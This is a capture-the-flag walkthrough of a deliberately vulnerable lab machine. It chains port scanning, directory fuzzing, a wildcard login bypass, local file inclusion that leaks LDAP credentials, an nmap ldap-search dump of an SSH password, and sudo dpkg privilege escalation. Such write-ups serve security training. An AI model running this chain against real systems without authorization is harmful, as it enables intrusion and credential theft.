*By Praveen Kumar Sharma*

<hr>

For me the IP of the machine is : **192.168.110.173**

Lets first try pinging it :

![[Pasted image 20240812195202.png]]

Its online!!

<hr>

### Port Scanning :

#### All Port Scanning 

```
nmap -p- -n -Pn -T5 --min-rate=10000 192.168.110.173 -o allPortScan.txt
```

![[Pasted image 20240812195431.png]]

>[!Open Ports]
>PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
636/tcp open  ldapssl

Lets try a aggressive scan on these ports 

#### Aggressive Scan :

```
nmap -sC -sV -A -T5 -p 22,80,389,636 192.168.110.173 -o aggresiveScan.txt
```

![[Pasted image 20240812195654.png]]

>[!Aggressive Scan]
>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Looks we do have some http action on port 80 lets try directory fuzzing 

<hr>

### Directory Fuzzing :

```
gobuster dir -u 192.168.110.173/ -w /usr/share/wordlists/dirb/common.txt -o directories.txt
```

![[Pasted image 20240812202250.png]]

>[!Directories]
>/admin.php            (Status: 200) [Size: 1650]
/index.html           (Status: 200) [Size: 207]
/static               (Status: 301) [Size: 319] [--> http://192.168.110.173/static/]


Lets get this web application underway 

<hr>

### Web Application :

![[Pasted image 20240812202500.png]]


Lets try the /static page here 

![[Pasted image 20240812202540.png]]

Nothing here looks like

Lets try that /admin.php

![[Pasted image 20240812202625.png]]

A login page looks like
I tried a lot of combination here but when i tried * and * it worked 

![[Pasted image 20240812202723.png]]

Lets try this portraits page here

![[Pasted image 20240812202908.png]]

Notice the URL we might have a LFI here

![[Pasted image 20240812203014.png]]

We do have a LFI i want to see that admin.php page tho first

i type in this http://192.168.110.173/home.php?url=admin.php

Go in source here 

![[Pasted image 20240812203112.png]]

>[!LDap Enumeration]
Username : cn=admin,dc=symfonos,dc=local
Attribute : qMDdyZh3cT6eeAWD


<hr>

### Gaining Access : 

I found this nmap nse script here that i can leverage to exploit this furthur here is the link : https://nmap.org/nsedoc/scripts/ldap-search.html

![[Pasted image 20240812203419.png]]

Lets try running this with our attrib and username we found 

here is the whole script btw 

```
nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local",ldap.password=qMDdyZh3cT6eeAWD,' 192.168.110.173
```

![[Pasted image 20240812203826.png]]
![[Pasted image 20240812203841.png]]

We have creds here

>[!User Creds]
>Username : zeus
>Password : cetkKf4wCuHC9FET


Lets try SSHing in 
and we can ssh in 

![[Pasted image 20240812204037.png]]

<hr>

### Vertical PrivEsc

Lets see what we can run using sudo : sudo -l

![[Pasted image 20240812204212.png]]

Lets check GTFObins for a way to privEsc
: https://gtfobins.github.io/gtfobins/dpkg/

![[Pasted image 20240812204321.png]]

This is the command we are gonna use to get root 

run this command as a whole and we get root 

![[Pasted image 20240812204410.png]]

Here is the proof 

![[Pasted image 20240812204450.png]]







